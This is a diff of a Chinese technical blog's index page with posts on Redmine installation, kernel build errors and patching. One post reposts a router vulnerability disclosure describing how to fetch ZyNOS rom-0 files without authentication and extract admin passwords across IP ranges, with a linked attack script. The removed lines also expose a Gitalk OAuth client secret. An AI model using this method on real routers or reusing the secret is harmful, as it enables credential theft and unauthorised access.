+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>最近有一个新项目需要用到项目管理工具，最后准备采用redmine，经过一系列的折腾，终于把它安装完成了，现在将安装过程分享出来，为那些遇到同样问题的同学做个参考。  </p>
+<p>首先按照<a href="http://www.redmine.org/projects/redmine/wiki/RedmineInstall" target="_blank" rel="noopener">官方网站</a>的步骤来安装，但是仍旧会碰到各种各样的问题。</p>
+<h2 id="1-下载Redmine源代码"><a href="#1-下载Redmine源代码" class="headerlink" title="1. 下载Redmine源代码"></a>1. 下载Redmine源代码</h2><p>这里利用git下载：</p>
+<pre><code>git clone https://github.com/redmine/redmine
+</code></pre><h2 id="2-安装配置MySQL"><a href="#2-安装配置MySQL" class="headerlink" title="2. 安装配置MySQL"></a>2. 安装配置MySQL</h2><p>已经安装过MySQL就不需要执行下面的命令：  </p>
+<pre><code>sudo apt-get install mysql-server mysql-client
+</code></pre><p>配置redmine数据库和用户：</p>
+<pre><code>mysql -u root -p
+CREATE DATABASE redmine CHARACTER SET utf8;
+CREATE USER &apos;redmine&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;my_password&apos;;
+GRANT ALL PRIVILEGES ON redmine.* TO &apos;redmine&apos;@&apos;localhost&apos;;&lt;/pre&gt;
+</code></pre><h2 id="3-数据库连接配置"><a href="#3-数据库连接配置" class="headerlink" title="3. 数据库连接配置"></a>3. 数据库连接配置</h2><p>首先要将redmine源码中 config/database.yml.example复制一份改名为config/database.yml。</p>
+<pre><code>cp  config/database.yml.example config/database.yml
+</code></pre><p>根据刚刚创建的redmine数据库修改config/database.yml</p>
+<pre><code>production:
+    adapter: mysql
+    database: redmine
+    host: localhost
+    username: redmine
+    password: &quot;my_password&quot;
+</code></pre><h2 id="4-安装依赖包"><a href="#4-安装依赖包" class="headerlink" title="4. 安装依赖包"></a>4. 安装依赖包</h2><p>首先得安装ruby和gem,然后使用gem安装bundler，最后通过bundle根据redmine下面的Gemfile安装所有需要安装的软件包。</p>
+<pre><code>sudo apt-get install ruby rubygems ruby1.8-dev ruby1.9.1-dev libmysqlclient-dev imagemagick libmagickwand-dev
+cd redmine
+</code></pre><p>/<em> 由于有GFW的存在，需要使用国内的gem源才能下载，先删除官方源，然后添加淘宝的源 </em>/</p>
+<pre><code>gem sources -r http://rubygems.org/
+gem source -a http://ruby.taobao.org
+sudo gem install bundler -V
+bundle install --without development test
+</code></pre><h2 id="5-Redmine配置"><a href="#5-Redmine配置" class="headerlink" title="5. Redmine配置"></a>5. Redmine配置</h2><pre><code>rake generate_secret_token
+RAILS_ENV=production rake db:migrate
+RAILS_ENV=production rake redmine:load_default_data
+</code></pre><h2 id="6-文件系统权限设置"><a href="#6-文件系统权限设置" class="headerlink" title="6. 文件系统权限设置"></a>6. 文件系统权限设置</h2><p>在Redmine下建立文件夹并设置相应权限  </p>
+<pre><code>mkdir -p tmp tmp/pdf public/plugin_assets
+sudo chmod -R 755 files log tmp public/plugin_assets
+</code></pre><h2 id="7-运行测试"><a href="#7-运行测试" class="headerlink" title="7. 运行测试"></a>7. 运行测试</h2><p>至此Redmine就安装完成了，现在就可以运行测试了。运行下面的命令进行测试：</p>
+<pre><code>ruby script/rails server webrick -e production
+</code></pre><p>运行上面的服务之后，我们就可以在浏览器中输入<a href="http://IP:3000" target="_blank" rel="noopener">http://IP:3000</a> 来测试。如果安装成功就会出现下面的网站界面：<br><img src="http://static.oschina.net/uploads/space/2014/0420/161230_YGrG_579952.png" alt=""><br>初始用户名/密码：admin/admin<br>但是这样启动之后中断窗口是不能关闭的，如果要像服务一样启动，得添加-d参数：</p>
+<pre><code>ruby script/server webrick -e production -d
+</code></pre><p>如果想要关闭服务，可以通过查看该服务的PID来关闭：</p>
+<pre><code>cat redmine/tmp/pids/server.pid
+kill -9 [PID]
+</code></pre><p>最后在使用redmine过程中发现网络连接很慢，按理说，是局域网内的访问应该很快的，后来调查之后发现是webrick捣的鬼，改用thin就好了。</p>
+<p>先在Gemfile文件中添加thin，然后再用bundle安装一下就可以了。</p>
+<pre><code>vim Gemfile
++#gem &apos;mongrel&apos;, &apos;1.2.0.pre2&apos;
++gem &apos;thin&apos;
+bundle install --without development test
+</code></pre><p>安装之后重新启动redmine服务，访问就快很多了。  </p>
+<pre><code>ruby script/rails server thin -e production -d
+</code></pre><h2 id="8-邮件服务配置"><a href="#8-邮件服务配置" class="headerlink" title="8. 邮件服务配置"></a>8. 邮件服务配置</h2><p>邮件服务配置需要修改config/configuration.yml，我的一个可以成功发送邮件的配置是：</p>
+<pre><code># default configuration options for all environments
+default:
+# Outgoing emails configuration (see examples above)
+email_delivery:
+delivery_method: :smtp
+smtp_settings:
+address: localhost
+port: 25
+domain: example.com
+# authentication: :login
+# user_name: &quot;redmine@example.net&quot;
+# password: &quot;redmine&quot;
+</code></pre><p>然后重启redmine服务，在管理&gt;&gt;配置&gt;&gt;邮件通知 中选择发送测试邮件进行测试。</p>
+<h2 id="9-结语"><a href="#9-结语" class="headerlink" title="9. 结语"></a>9. 结语</h2><p>在整个安装的过程中碰到了很多问题，大部分都是缺少依赖包的，在前面的安装中都已经提示出来了。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fengguoqing.github.io/2014/04/14/Linux-kernel-make-menuconfig-时出错处理方法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Frank Feng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frank's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2014/04/14/Linux-kernel-make-menuconfig-时出错处理方法/" itemprop="url">Linux kernel make menuconfig 时出错处理方法</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-04-14T17:53:42+08:00">
+                2014-04-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在Ubuntu 12.04的环境下编译最新的linux 3.14代码时出现下面的错误：</p>
+<pre><code>$makemenuconfig
+HOSTLDscripts/kconfig/mconf
+scripts/kconfig/mconf.o:Infunction`show_help&apos;:
+mconf.c:(.text+0x8a4):undefinedreferenceto`stdscr&apos;
+scripts/kconfig/lxdialog/checklist.o:Infunction`print_arrows&apos;:
+checklist.c:(.text+0x41):undefinedreferenceto`wmove&apos;
+checklist.c:(.text+0x61):undefinedreferenceto`acs_map&apos;
+......
+menubox.c:(.text+0x3a9):undefinedreferenceto`wrefresh&apos;
+scripts/kconfig/lxdialog/menubox.o:Infunction`print_buttons&apos;:
+menubox.c:(.text+0x4ef):undefinedreferenceto`wrefresh&apos;
+collect2:ldreturned1exitstatus
+make[1]:***[scripts/kconfig/mconf]Error1
+make:***[menuconfig]Error2`&lt;/pre&gt; 
+
+&lt;span style=&quot;line-height: 23px;&quot;&gt;由于缺少必要的package，所以出现了编译问题。&lt;/span&gt;
+
+&lt;span style=&quot;font-size: 12.5px;&quot;&gt;出现这个问题的处理方法：&lt;/span&gt;
+
+&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`sudoapt-getinstallbuild-essentiallibncurses5libncurses5-dev
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fengguoqing.github.io/2014/02/15/解决三星手机WIFI“此网络不可用。证书已到期”方法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Frank Feng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frank's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2014/02/15/解决三星手机WIFI“此网络不可用。证书已到期”方法/" itemprop="url">解决三星手机WIFI“此网络不可用。证书已到期”方法</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-02-15T18:11:22+08:00">
+                2014-02-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>最近三星手机升级到了4.3，但是升级完了之后WIFI就出现了问题，有时候根本就连不上，有时候连上了还要弹出一个网页登陆，登陆完之后，用一会就自己断掉了，弹出通知说“此网络不可用。证书已到期”，无法自动重连。没有升级之前都是很好用的。试了很多办法，比如重启手机，重启路由器，忘记密码重新登陆，都没有作用。</p>
+<p>后来想到了给WIFI热点重新起一个名字，作为一个新的WIFI热点来登陆，后来果然就可以正常使用了，可能是升级前后证书有所改变，所以原来的WIFI无法继续登陆了。</p>
+<p>希望可以帮助碰到相同问题的同学。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fengguoqing.github.io/2014/01/19/某些TP-Link路由器可以被远程获取密码/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Frank Feng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frank's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2014/01/19/某些TP-Link路由器可以被远程获取密码/" itemprop="url">某些TP-Link路由器可以被远程获取密码</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-01-19T17:59:38+08:00">
+                2014-01-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="HOW-I-SAVED-YOUR-A-FROM-THE-ZYNOS-ROM-0-ATTACK-FULL-DISCLOSURE"><a href="#HOW-I-SAVED-YOUR-A-FROM-THE-ZYNOS-ROM-0-ATTACK-FULL-DISCLOSURE" class="headerlink" title="HOW I SAVED YOUR A** FROM THE ZYNOS (ROM-0) ATTACK !! ( FULL DISCLOSURE )"></a>HOW I SAVED YOUR A** FROM THE ZYNOS (ROM-0) ATTACK !! ( FULL DISCLOSURE )</h4><p>Hello everyone, I just wanted to discuss some vulnerability I found and exploited for GOODNESS .. just so that SCRIPT KIDIES won’t attack your home/business network .</p>
+<p>Well, in Algeria the main ISP ( Algerie Telecom ) provide you with a router when you pay for an internet plan. So you can conclude that every subscriber is using that router . TD-W8951ND is one of them, I did some ip scanning and I found that every router is using ZYXEL embedded firmware.</p>
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis :"></a><strong>Analysis :</strong></h3><p>Let’s download an update and take a look at it and try to find some vulnerabilities. ( <a href="http://www.tp-link.com/Resources/software/TD-W8951ND_V3.0_110729_FI.rar" target="_blank" rel="noopener">http://www.tp-link.com/Resources/software/TD-W8951ND_V3.0_110729_FI.rar </a>)</p>
+<p><a href="http://static.oschina.net/uploads/img/201401/19175934_8zu4.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175934_qaNU.jpg" alt="lif" title="lif"></a></p>
+<p>The ras file is in LIF format !! …<br>Hmmm let’s put that file for Binwalk test for God’s sake ! ( check :<a href="http://code.google.com/p/binwalk/wiki/Installation" target="_blank" rel="noopener">http://code.google.com/p/binwalk/wiki/Installation</a> for more informations on how to install it ).</p>
+<p>This is what Binwalk told me about that file :<br><a href="http://static.oschina.net/uploads/img/201401/19175934_veKb.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175934_svCo.jpg" alt="zynos" title="zynos"></a></p>
+<p>You can clearly see and confirm that the router is using zynos firmware. We can also see that there is two blocks of LZMA compressed data … let’s extract them and have a look.<br><a href="http://static.oschina.net/uploads/img/201401/19175935_0q2n.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175935_6pIO.jpg" alt="extract1" title="extract1"></a></p>
+<p>The problem is that when I tried to decompress the two blocks I get an error : ” Compressed data is corrupt “</p>
+<p><a href="http://static.oschina.net/uploads/img/201401/19175935_xf7b.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175935_U9nN.jpg" alt="error" title="error"></a></p>
+<p>Hmm, first the “ras” file was in LIF format .. and now the lzma compress blocks are corrupted !!<br>I googled this and tried to find a solution for this, <strong>FOUND NOTHING</strong> . How am I going to solve this ??<br>One idea came in my mind .. “Strings” command and here is what I got :</p>
+<p><a href="http://static.oschina.net/uploads/img/201401/19175935_cqNB.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175936_vM18.jpg" alt="strings" title="strings"></a></p>
+<p>Aaaah ! so the blocks aren’t compressed with LZMA or anything ! and the whole “ras” firmware file is just big chunk of data in clear text.<br>Ok, let’s try and find some useful STRINGS …</p>
+<p>After some time searching “I” didn’t find the useful thing that will help us find vulnerabilities on the firmware !!</p>
+<p>I didn’t give up …<br>I just was thinking and questioning :</p>
 <ul>
-<li>搜索支持文章标题、标签(#标签)、作者(@作者)</li>
-<li>pad/手机等移动端适配</li>
-<li>页面全局快捷键 <a href='http://yelog.org/2017/03/24/3-hexo-shortcuts/'>3-hexo快捷键说明</a></li>
+<li><p>Me: What do you want from this firmware file !</p>
+</li>
+<li><p>Me: I want to find remote vulnerabilities that will help me extract the “admin” password.</p>
+</li>
+<li><p>Me: Does the web interface let you save the current configuration ? </p>
+</li>
 </ul>
+<p><a href="http://static.oschina.net/uploads/img/201401/19175936_Jez1.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175936_PIlE.jpg" alt="rom-save" title="rom-save"></a></p>
+<ul>
+<li><p>Me: yes !!</p>
+</li>
+<li><p>Me: Is the page password protected ? </p>
+</li>
+</ul>
+<p><a href="http://static.oschina.net/uploads/img/201401/19175936_T61n.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175936_ypc5.jpg" alt="password-protected" title="password-protected"></a></p>
+<ul>
+<li>Me: No !!! I tired to access that page on a different IP and it didn’t require a passowrd ! </li>
+</ul>
+<p>Ok, enough questions haha ..</p>
+<p>Now, when I activated TamperData and clicked “ROMFILE SAVE”&#160; I’ve found out that the rom-0 file is located on “IP/rom-0″ and the directory isn’t password protected or anything.</p>
+<p>So we are able to download the configuration file which contains the “admin” password. I took a look at rom-0 file and couldn’t figure out how to reverse-engineer it, and when you don’t know something it’s not a shame to ask for help .. and that’s what I did !<br>I contacted “<strong>Craig</strong>” from <a href="http://devttys0.com/" target="_blank" rel="noopener">devttys0.com</a>, he is an expect when it comes to hacking embdded devices . He’s a great guy and he replied to my email and pointed me to <a href="http://50.57.229.26/zynos.php" target="_blank" rel="noopener">http://50.57.229.26/zynos.php</a>which is a free rom-0 file decompressor .</p>
+<p><a href="http://static.oschina.net/uploads/img/201401/19175937_whRc.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175937_NJ9G.jpg" alt="decompress" title="decompress"></a></p>
+<p>When you upload and submit the rom-0 file there, the php page replies back with the configuration in clear text ( <strong>INCLUDING THE PASSWORD</strong> ) .</p>
+<p>So what i need to do now is to automate the process of :</p>
+<ul>
+<li><p>Download rom-0 file.</p>
+</li>
+<li><p>Upload it to <a href="http://50.57.229.26/zynos.php" target="_blank" rel="noopener">http://50.57.229.26/zynos.php</a></p>
+</li>
+<li><p>get the repy back and extract the admin password from it.</p>
+</li>
+<li><p>loop this process to a range of ip addresses. </p>
+</li>
+</ul>
+<p>And that’s exactly what I did, I opened an OLD OLD poc python script of mine that accessed routers via telnet using the default passwords. So what I just need to do now is to add some functionality to it.</p>
+<p>Well I thought about&#160; this, and I’m posting this script online <strong>ONLY FOR EDUCATIONAL PURPOSES.</strong></p>
+<p>You can find the scripts here : <a href="https://github.com/MrNasro/zynos-attacker/" target="_blank" rel="noopener">https://github.com/MrNasro/zynos-attacker/</a></p>
+<p>Demo :</p>
+<p><a href="http://static.oschina.net/uploads/img/201401/19175937_xoJZ.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175937_vATX.jpg" alt="demo" title="demo"></a></p>
+<p><strong>PS : I OWN ALL THE IP RANGE I WAS SCANNING ” FOR SURE <img src="http://static.oschina.net/uploads/img/201401/19180126_0Zrk.gif" alt=";)"> “</strong></p>
+<h3 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention :"></a>Prevention :</h3><p>Now ! how do you prevent attackers from downloading your rom-0 configuration file and manipulating your router ? This is pretty simple if you think about it ..<br>You just have to forward port 80 on the router to and inused IP address on your network :<br><a href="http://static.oschina.net/uploads/img/201401/19175937_XPrm.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175938_gdlc.jpg" alt="forward" title="forward"></a></p>
+<p><strong>THATS ALL, </strong>or if you want to play a little with attackers that are using scripts too .. just forward port 80 to you local http server and put a LARGE file in the root directory and name it rom-0 .. just let them download like 1GB rom-0 file haha haha .. I have also automated the process of port forwarding and I’m running the scripts daily just to prevent hackers from attacking weak users …</p>
+<p>In the next post I’ll demonstrate how would a malicious hacker exploit this to hack TONS of networks and get a meterpreter/reverse_shell on every PC on the target network ..</p>
+<p>Hope you enjoyed this analysis, if you have anything to add or any questions to ask don’t hesitate to contact me ! <strong>BE THEIR HERO, HAPPY HACKING <img src="http://static.oschina.net/uploads/img/201401/19180126_0Zrk.gif" alt=";)"></strong></p>
 
-        </article>
+          
         
-        <p>
-            <a href="javascript:void(0)" class="dashang" onclick="dashangToggle()">赏</a>
-        </p>
-        
-        
+      
+    </div>
     
-        <div id="comments"></div>
-<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-
-<script src="/js/gitalk.js"></script>
-<script type="text/javascript">
-    var gitalk = new Gitalk({
-        clientID: '0ca591cbd574403caa05',
-        clientSecret: '7528dfe6f91bb9293827feb0cad3bc6e8d63d3ed',
-        repo: 'fengguoqing.github.io',
-        owner: 'true',
-        admin: ['fengguoqing'],
-        id: location.pathname,
-        distractionFreeMode: 'true',
-        language: 'zh-CN',
-        perPage: parseInt('10',10)
-    })
-gitalk.render('comments')
-</script>
+    
     
 
-    </div>
-    <div class="copyright">
-        <p class="footer-entry">©2017 Frank Feng</p>
-<p class="footer-entry">Buit with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+    
 
-    </div>
-    <div class="full-toc">
-        <button class="full"><span class="min "></span></button>
-<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
-<div class="post-toc"><span class="post-toc-title">目录</span>
-    <div class="post-toc-content">
+    
 
-    </div>
-</div>
-<a class="" id="rocket" href="javascript:void(0)"></a>
-    </div>
-</div>
-<div class="acParent"></div>
-<div class="hide_box" onclick="dashangToggle()"></div>
-<div class="shang_box">
-    <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
-    <div class="shang_tit">
-        <p>喜欢就点赞,疼爱就打赏</p>
-    </div>
-    <div class="shang_payimg">
-        <div class="pay_img">
-            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
-            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fengguoqing.github.io/2013/12/02/生成和打上patch的方法/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Frank Feng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frank's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2013/12/02/生成和打上patch的方法/" itemprop="url">生成和打上patch的方法</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2013-12-02T13:24:16+08:00">
+                2013-12-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
         </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在团队开发的过程中，经常需要生成patch，或者打上别人提供的patch，那么一般情况是如何操作的呢。</p>
+<p>首先生成patch需要有两个工程，一个修改前的A工程，一个修改后的B工程。</p>
+<p>使用linux命令diff就可以生成patch了。格式如下：</p>
+<pre><code>diff-Naurpath/to/A_Projectpath/to/B_Project&gt;Project.patch`&lt;/pre&gt; 
+
+ **-N**选项确保补丁文件将正确地处理已经创建或删除文件的情况。
+
+ **-a** 将所有文件都当作文本文件处理。
+
+ **-u**输出每个修改前后的3行，也可以用-u5等指定输出更多上下文。
+
+ **-r**递归。设置后diff会将两个不同版本源代码目录中的所有对应文件全部都进行一次比较，包括子目录文件。
+
+生成patch以后，在修改前A工程根目录下使用patch命令打上patch。
+
+&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`$cdpath/to/A_Project
+$patch-p1&lt;Project.patch`&lt;/pre&gt; 
+
+**  -p Num**忽略几层文件夹
+
+&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;为了解释&lt;/span&gt;&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;-p&lt;/span&gt;&lt;span style=&quot;line-height:1.5;font-size:10pt;&quot;&gt;参数，需要看看如下patch文件片段：&lt;/span&gt; 
+
+&lt;pre class=&quot;diff source-diff&quot;&gt;`---old/modules/pcitableMonSep2711:03:561999+++new/modules/pcitableTueDec1920:05:412000`&lt;/pre&gt; 
+
+如果使用参数-p0，那就表示从当前目录找一个叫做old的文件夹，再在它下面寻找modules/pcitable文件来执行patch操作。
+ 而如果使用参数-p1，那就表示忽略第一层目录（即不管old），从当前目录寻找modules的文件夹，再在它下面找pcitable。
+
+如果要取消补丁做出的更改，恢复旧版本，在A工程的根目录下执行以下命令，A工程就会恢复成没有打patch的样子：
+
+&lt;pre class=&quot;bash source-bash&quot;&gt;`$patch-RE-p0&lt;Project.patch`&lt;/pre&gt; 
+
+由Git管理的工程处理patch的方法：
+
+【生成patch】
+
+分支master 上是没修改前的，分支patch 上是修改以后的打patch的。
+
+1\. 先切换到 patch分支
+
+&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`gitcheckoutpatch`&lt;/pre&gt; 
+
+2\. 生成patch
+
+&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`gitformat-patch-Mmaster`&lt;/pre&gt; 
+
+&lt;span style=&quot;line-height:1.5;&quot;&gt;会生成一个文件名如：0002-Release-version-1.4.6.patch 的patch文件&lt;/span&gt; 
+
+&lt;span style=&quot;line-height:1.5;&quot;&gt;【合并patch】&lt;/span&gt; 
+
+拿到patch以后，执行下面的命令：
+
+&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`gitam0002-Release-version-1.4.6.patch`&lt;/pre&gt; 
+
+如果不想直接commit，那么可以用下面这个命令打patch：
+
+&lt;pre class=&quot;brush:shell; toolbar: true; auto-links: false;&quot;&gt;`patch-p1&lt;0002-Release-version-1.4.6.patch
+</code></pre><p>然后手动commit。</p>
+
+          
+        
+      
     </div>
-    <div class="shang_payselect">
-        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fengguoqing.github.io/2013/11/07/Ubuntu默认启动到文本界面/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Frank Feng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frank's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2013/11/07/Ubuntu默认启动到文本界面/" itemprop="url">Ubuntu默认启动到文本界面</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2013-11-07T10:50:18+08:00">
+                2013-11-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p> 使用虚拟机安装ubuntu之后感觉机器有点吃力，为了缓解这种压力，直接启动到文本界面，然后使用Xshell或者putty等工具登录，相当的happy。设置方法如下： </p>
+<pre><code>$ sudo vim /etc/default/grub
+- GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash&quot;
++ GRUB_CMDLINE_LINUX_DEFAULT=&quot;text&quot;
+$ sudo update-grub
+$ sudo reboot
+</code></pre><p> 重启完之后就直接进入了文件界面，虚拟机的开销就会减小很多了。 </p>
+
+          
+        
+      
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://fengguoqing.github.io/2013/11/02/基于linux-3-10的yaffs2移植/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Frank Feng">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Frank's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
